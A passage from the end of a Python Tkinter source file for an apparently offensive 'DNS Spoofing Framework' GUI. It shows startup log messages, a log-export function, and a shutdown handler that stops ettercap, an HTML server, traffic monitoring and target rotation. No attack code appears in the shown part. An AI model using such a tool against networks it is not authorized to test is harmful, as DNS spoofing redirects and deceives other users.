
log_output("🚀 ScreamWare DNS Spoofing Framework Initialized", "success")
log_output("⚠️ Warning: This tool is for authorized security testing only", "warning")
log_output("💡 Double-click hosts in Network Discovery to auto-fill targets", "info")
log_output(f"🧪 HTML Lab folder: {str(HTML_LAB_DIR)} (served by Apache at var/www/html/ if started)", "info")

# Check dependencies on startup (non-blocking)
threading.Thread(target=check_dependencies, daemon=True).start()

# Export logs function (uses filedialog)
def export_logs():
    try:
        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt"), ("All files", "*.*")], initialfile=f"screamware_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
        if filename:
            with open(filename, 'w') as f:
                f.write(output_text.get(1.0, tk.END))
            log_output(f"📄 Logs exported to {filename}", "success")
    except Exception as e:
        log_output(f"❌ Failed to export logs: {e}", "error")

# Bind close handler for cleanup
def on_close():
    try:
        # Stop all active processes
        stop_ettercap()
        stop_html_server()
        stop_traffic_monitor()
        stop_target_rotation()

        # Perform automated cleanup
        perform_cleanup()

        log_output("👋 ScreamWare shutting down - Cleanup completed", "info")
    except Exception as e:
        log_output(f"⚠️ Error during shutdown cleanup: {e}", "warning")

    root.destroy()

root.protocol("WM_DELETE_WINDOW", on_close)

# Run GUI
root.mainloop()
